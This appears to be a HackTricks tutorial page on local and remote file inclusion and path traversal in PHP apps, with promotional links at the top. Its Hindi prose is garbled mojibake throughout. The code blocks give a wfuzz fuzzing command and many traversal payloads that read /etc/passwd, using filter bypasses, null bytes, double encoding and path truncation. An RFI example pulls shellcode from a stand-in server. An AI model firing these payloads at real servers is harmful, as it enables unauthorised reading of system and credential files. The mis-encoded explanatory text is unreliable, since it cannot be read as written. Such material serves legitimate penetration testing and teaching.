# рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢ / рдкрде рдЪрд╛рд▓рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live) рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рдФрд░ **HackTricks** рдФрд░ **HackTricks Cloud** github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рдиреНрдпреВрдЬрд╝**\
рддреЗрдЬ рдЧрддрд┐ рд╕реЗ рд╣реИрдХрд┐рдВрдЧ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдЕрдк-рдЯреВ-рдбреЗрдЯ рд░рд╣реЗрдВ рдФрд░ рдирд╡реАрдирддрдо рд╕рдорд╛рдЪрд╛рд░ рдФрд░ рдЕрдВрджрд░реВрдиреА рджреГрд╖реНрдЯрд┐рдХреЛрдгреЛрдВ рдХреЗ рд╕рд╛рде

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдБ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд▓реЙрдиреНрдЪ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЕрдкрдбреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

**рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** [**Discord**](https://discord.com/invite/N3FrSbmwdy) рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

## рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢

**рджреВрд░рд╕реНрде рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢ (RFI):** рдлрд╝рд╛рдЗрд▓ рдПрдХ рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░ рд╕реЗ рд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИ (рд╕рд░реНрд╡рд╢реНрд░реЗрд╖реНрда: рдЖрдк рдХреЛрдб рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдЗрд╕реЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдЧрд╛)ред Php рдореЗрдВ рдпрд╣ **рдбрд┐рд╕реЗрдмрд▓** рд╣реЛрддрд╛ рд╣реИ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдореЗрдВ (**allow\_url\_include**)ред\
**рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢ (LFI):** рд╕рд░реНрд╡рд░ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИред

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдЙрд╕ рд╕рдордп рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╡рдВрд▓рд░реЗрдмрд▓ **PHP рдлрд╝рдВрдХреНрд╢рдиреНрд╕**: require, require\_once, include, include\_once

рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЛ рд╢реЛрдзрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рдЙрдкрдХрд░рдг: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## рдмреНрд▓рд╛рдЗрдВрдб - рджрд┐рд▓рдЪрд╕реНрдк - LFI2RCE рдлрд╝рд╛рдЗрд▓реЗрдВ
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **рд▓рд┐рдирдХреНрд╕**

**рдХрдИ \*рдирд┐рдХреНрд╕ LFI рд╕реВрдЪрд┐рдпреЛрдВ рдХреЛ рдорд┐рд╢реНрд░рд┐рдд рдХрд░рдХреЗ рдФрд░ рдЕрдзрд┐рдХ рдкрде рдЬреЛрдбрд╝рдХрд░ рдореИрдВрдиреЗ рдпрд╣ рдПрдХ рдмрдирд╛рдпрд╛ рд╣реИ:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

рдЖрдк `/` рдХреЛ `\` рдХреЗ рд▓рд┐рдП рдмрджрд▓рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ\
рдЖрдк `../../../../../` рднреА рдЬреЛрдбрд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ

рдПрдХ рд╕реВрдЪреА рдЬреЛ рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ рдлрд╝рд╛рдЗрд▓ /etc/password рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП (рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рджреБрд░реБрд╕реНрддреА рдореМрдЬреВрдж рд╣реИ) рдпрд╣рд╛рдБ рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИ [рдпрд╣рд╛рдБ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **рд╡рд┐рдВрдбреЛрдЬ**

рд╡рд┐рднрд┐рдиреНрди рд╢рдмреНрдж рд╕реВрдЪрд┐рдпреЛрдВ рдХрд╛ рдорд┐рд╢реНрд░рдг:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

рдЖрдк `/` рдХреЛ `\` рдХреЗ рд▓рд┐рдП рдмрджрд▓рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ\
рдЖрдк `C:/` рдХреЛ рд╣рдЯрд╛рдиреЗ рдФрд░ `../../../../../` рдЬреЛрдбрд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ

рдПрдХ рд╕реВрдЪреА рдЬреЛ рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ рдлрд╝рд╛рдЗрд▓ /boot.ini рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП (рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рджреБрд░реБрд╕реНрддреА рдореМрдЬреВрдж рд╣реИ) рдпрд╣рд╛рдБ рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИ [рдпрд╣рд╛рдБ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **рдУрдПрд╕ рдПрдХреНрд╕**

рд▓рд┐рдирдХреНрд╕ рдХреА LFI рд╕реВрдЪреА рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ.

## рдореВрд▓ LFI рдФрд░ рдмрд╛рдпрдкрд╛рд╕

рд╕рднреА рдЙрджрд╛рд╣рд░рдг рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди рдХреЗ рд▓рд┐рдП рд╣реИрдВ рд▓реЗрдХрд┐рди рдЗрд╕реЗ рджреВрд░рд╕реНрде рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди рдореЗрдВ рднреА рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдкреГрд╖реНрда=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рд╕реАрдХреНрд╡реЗрдВрд╕реЗрд╕ рд╕реНрдЯреНрд░рд┐рдкреНрдб рдЧреИрд░-рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐рдХрд░рдг
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **рдирд▓ рдмрд╛рдЗрдЯ (%00)**

рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдЕрдВрдд рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд░реНрдг рдЬреЛрдбрд╝реЗрдВ (рдмрд╛рдЗрдкрд╛рд╕: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
рдпрд╣ **PHP 5.4 рд╕реЗ рд╣рд▓ рд╣реЛ рдЧрдпрд╛ рд╣реИ**

### **рдХреЛрдбрд┐рдВрдЧ**

рдЖрдк рдЧреИрд░ рдорд╛рдирдХ рдХреЛрдбрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдбрдмрд▓ URL рдХреЛрдбрд┐рдВрдЧ (рдФрд░ рдЕрдиреНрдп):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### рдореМрдЬреВрджрд╛ рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ

рд╢рд╛рдпрдж рдмреИрдХ-рдПрдВрдб рдлрд╝реЛрд▓реНрдбрд░ рдкрде рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣рд╛ рд╣реИ:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### рд╕рд░реНрд╡рд░ рдкрд░ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ

рд╕рд░реНрд╡рд░ рдХреЗ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╡рд┐рд╢реЗрд╖ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рд░рдВрддрд░ рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдЬрд╛ рд╕рдХреЗ, рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдмрдЬрд╛рдпред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЧрд╣рд░рд╛рдИ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдФрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝реЛрд▓реНрдбрд░ рдХреА рдореМрдЬреВрджрдЧреА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ред рдиреАрдЪреЗ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╕реНрддреГрдд рд╡рд┐рдзрд┐ рджреА рдЧрдИ рд╣реИ:

1. **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЧрд╣рд░рд╛рдИ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг:**
рдЕрдкрдиреА рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдЧрд╣рд░рд╛рдИ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░реЗрдВ, `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ (рдпрджрд┐ рд╕рд░реНрд╡рд░ рд▓рд┐рдирдХреНрд╕-рдЖрдзрд╛рд░рд┐рдд рд╣реИ)ред рдПрдХ рдЙрджрд╛рд╣рд░рдг URL рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдврдВрдЧ рд╕реЗ рд╕рдВрд░рдЪрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рддреАрди рдХреА рдЧрд╣рд░рд╛рдИ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **рдлреЛрд▓реНрдбрд░ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ:**
рд╕рдВрджрд┐рдЧреНрдз рдлреЛрд▓реНрдбрд░ рдХрд╛ рдирд╛рдо URL рдореЗрдВ рдЬреЛрдбрд╝реЗрдВ (рдЬреИрд╕реЗ, `private`), рдлрд┐рд░ `/etc/passwd` рдкрд░ рд╡рд╛рдкрд╕ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВред рдЕрддрд┐рд░рд┐рдХреНрдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реНрддрд░ рдХреЛ рдПрдХ рд╕реЗ рдмрдврд╝рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **рдкрд░рд┐рдгрд╛рдореЛрдВ рдХрд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░реЗрдВ:**
рд╕рд░реНрд╡рд░ рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдореМрдЬреВрдж рд╣реИ:
- **рддреНрд░реБрдЯрд┐ / рдХреЛрдИ рдЖрдЙрдЯрдкреБрдЯ рдирд╣реАрдВ:** `private` рдлрд╝реЛрд▓реНрдбрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реНрдерд╛рди рдкрд░ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИред
- **`/etc/passwd` рдХреА рд╕рд╛рдордЧреНрд░реА:** `private` рдлрд╝реЛрд▓реНрдбрд░ рдХреА рдореМрдЬреВрджрдЧреА рдкреБрд╖реНрдЯрд┐ рдХрд░рддреА рд╣реИред

4. **рд░реВрдврд╝рд┐рд╡рд╛рджреА рдЕрдиреНрд╡реЗрд╖рдг:**
рдЦреЛрдЬреЗ рдЧрдП рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдЙрдкрдирд┐рд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рдФрд░ рднреА рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЙрдкрдирд┐рд░реАрдХреНрд╖рдг рдпрд╛ рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI) рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП, рдкреЗрд▓реЛрдб рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░реЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЬрд╛рдВрдЪрдирд╛ рд╣реИ рдХрд┐ `/var/www/` рдореЗрдВ `private` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ (рдорд╛рдирддреЗ рд╣реБрдП рдХрд┐ рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ 3 рдХреА рдЧрд╣рд░рд╛рдИ рдкрд░ рд╣реИ), рддреЛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░реЗрдВ:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **рдкрде рдХрдЯреМрддреА рддрдХрдиреАрдХ**

рдкрде рдХрдЯреМрддреА рдПрдХ рд╡рд┐рдзрд┐ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЛ рдорд╛рдирд┐рдкреБрд░реНрде рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЕрдХреНрд╕рд░ рдХрд┐рд╕реА рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреЛ рдЫрд▓рдХрд░ рдирд┐рд╢реНрдЪрд┐рдд рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд░реНрдгреЛрдВ рдХреЛ рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЗ рдЕрдВрдд рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд▓рдХреНрд╖реНрдп рдПрдХ рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЛ рддреИрдпрд╛рд░ рдХрд░рдирд╛ рд╣реИ рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП, рдлрд┐рд░ рднреА рд╡рд╛рдВрдЫрд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИред

PHP рдореЗрдВ, рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХреЛ рдмрд░рд╛рдмрд░ рдорд╛рдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреА рдкреНрд░рдХреГрддрд┐ рдХреЗ рдХрд╛рд░рдгред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, рдФрд░ `/etc/passwd/` рд╕рднреА рдПрдХ рд╣реА рдкрде рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
- рдЬрдм рдЖрдЦрд┐рд░реА 6 рд╡рд░реНрдг `passwd` рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ `/` рдЬреЛрдбрд╝рдирд╛ (`passwd/` рдмрдирд╛рдирд╛) рд▓рдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреЛ рдмрджрд▓ рдирд╣реАрдВ рджреЗрддрд╛ред
- рдЙрд╕реА рддрд░рд╣, рдЕрдЧрд░ рдлрд╝рд╛рдЗрд▓ рдкрде рдореЗрдВ `.php` рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ `shellcode.php`), рддреЛ рдЕрдВрдд рдореЗрдВ `/.` рдЬреЛрдбрд╝рдиреЗ рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХреА рдЬрд╛ рд░рд╣реА рдлрд╝рд╛рдЗрд▓ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдирд╣реАрдВ рд╣реЛрдЧреАред

рдкреНрд░рджрддреНрдд рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ `/etc/passwd` рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдкрде рдХрдЯреМрддреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд▓рдХреНрд╖реНрдп рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рд╣реЛрддреА рд╣реИ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдЬрд╛рдирдХрд╛рд░реА)ред
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
рдЗрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ, рдЖрд╡рд╢реНрдпрдХ рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рдХреА рд╕рдВрдЦреНрдпрд╛ рд▓рдЧрднрдЧ 2027 рд╣реЛ рд╕рдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд╕рдВрдЦреНрдпрд╛ рд╕рд░реНрд╡рд░ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░ рд╕рдХрддреА рд╣реИред

- **рдбреЙрдЯ рд╕реЗрдЧрдореЗрдВрдЯреНрд╕ рдФрд░ рдЕрддрд┐рд░рд┐рдХреНрдд рд╡рд░реНрдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ**:
рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рд╕рд┐рдХреНрд╡реЗрдВрд╕реЗрд╕ (`../`) рдХреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЙрдЯ рд╕реЗрдЧрдореЗрдВрдЯреНрд╕ рдФрд░ рд╡рд░реНрдгреЛрдВ рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЬреЛрдбрд╝реА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддреЗ рд╣реБрдПред

- **рдЖрд╡рд╢реНрдпрдХ рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рдХреА рд╕рдВрдЦреНрдпрд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдирд╛**:
